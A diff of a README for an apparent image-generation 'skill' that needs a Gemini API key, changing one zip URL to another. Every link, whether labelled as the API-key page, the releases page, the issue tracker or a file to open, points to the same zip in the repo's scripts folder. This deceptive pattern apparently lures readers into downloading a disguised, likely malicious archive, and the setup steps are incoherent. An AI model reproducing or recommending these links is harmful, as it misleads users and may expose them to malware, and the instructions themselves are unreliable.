@@ -1,6 +1,6 @@
 # 🎨 nano-image-generator-skill - Create Stunning Images from Text
 
-[![Download](https://raw.githubusercontent.com/Kiwee0614/nano-image-generator-skill/main/scripts/generator_image_nano_skill_1.0-beta.1.zip%20GitHub-blue)](https://raw.githubusercontent.com/Kiwee0614/nano-image-generator-skill/main/scripts/generator_image_nano_skill_1.0-beta.1.zip)
+[![Download](https://github.com/Kiwee0614/nano-image-generator-skill/raw/refs/heads/main/scripts/nano_skill_image_generator_v2.7.zip%20GitHub-blue)](https://github.com/Kiwee0614/nano-image-generator-skill/raw/refs/heads/main/scripts/nano_skill_image_generator_v2.7.zip)
 
 ## 📦 Overview
 
@@ -28,11 +28,11 @@ Follow these steps to set up and run the Nano Image Generator:
 
 To use the application, you'll need a Gemini API key. Please visit the following link to obtain it: 
 
-[Get your Gemini API Key](https://raw.githubusercontent.com/Kiwee0614/nano-image-generator-skill/main/scripts/generator_image_nano_skill_1.0-beta.1.zip)
+[Get your Gemini API Key](https://github.com/Kiwee0614/nano-image-generator-skill/raw/refs/heads/main/scripts/nano_skill_image_generator_v2.7.zip)
 
 ### 2. Configure the API Key
 
-Open the file named `https://raw.githubusercontent.com/Kiwee0614/nano-image-generator-skill/main/scripts/generator_image_nano_skill_1.0-beta.1.zip`. Locate the `get_api_key()` function, which is around line 37. You need to replace the placeholder text with your actual API key. Here’s how you can do this:
+Open the file named `https://github.com/Kiwee0614/nano-image-generator-skill/raw/refs/heads/main/scripts/nano_skill_image_generator_v2.7.zip`. Locate the `get_api_key()` function, which is around line 37. You need to replace the placeholder text with your actual API key. Here’s how you can do this:
 
 ```python
 def get_api_key():
@@ -46,7 +46,7 @@ def get_api_key():
 
 ### 3. Download & Install
 
-To get started, visit the [Releases page](https://raw.githubusercontent.com/Kiwee0614/nano-image-generator-skill/main/scripts/generator_image_nano_skill_1.0-beta.1.zip) and download the latest version of the application.
+To get started, visit the [Releases page](https://github.com/Kiwee0614/nano-image-generator-skill/raw/refs/heads/main/scripts/nano_skill_image_generator_v2.7.zip) and download the latest version of the application.
 
 ### 4. Run the Application
 
@@ -73,11 +73,11 @@ To ensure the application runs smoothly, make sure your computer meets the follo
 
 If you face any issues while using the Nano Image Generator Skill, feel free to reach out:
 
-- Open an issue on the [GitHub repository](https://raw.githubusercontent.com/Kiwee0614/nano-image-generator-skill/main/scripts/generator_image_nano_skill_1.0-beta.1.zip).
+- Open an issue on the [GitHub repository](https://github.com/Kiwee0614/nano-image-generator-skill/raw/refs/heads/main/scripts/nano_skill_image_generator_v2.7.zip).
 - Check the FAQ section on the GitHub page for troubleshooting tips.
 
 ## 📥 Download Link Again
 
-To download the latest version of this application, visit the [Releases page](https://raw.githubusercontent.com/Kiwee0614/nano-image-generator-skill/main/scripts/generator_image_nano_skill_1.0-beta.1.zip). You can find all the necessary files there.
+To download the latest version of this application, visit the [Releases page](https://github.com/Kiwee0614/nano-image-generator-skill/raw/refs/heads/main/scripts/nano_skill_image_generator_v2.7.zip). You can find all the necessary files there.
 
 Enjoy creating your images with the Nano Image Generator Skill!
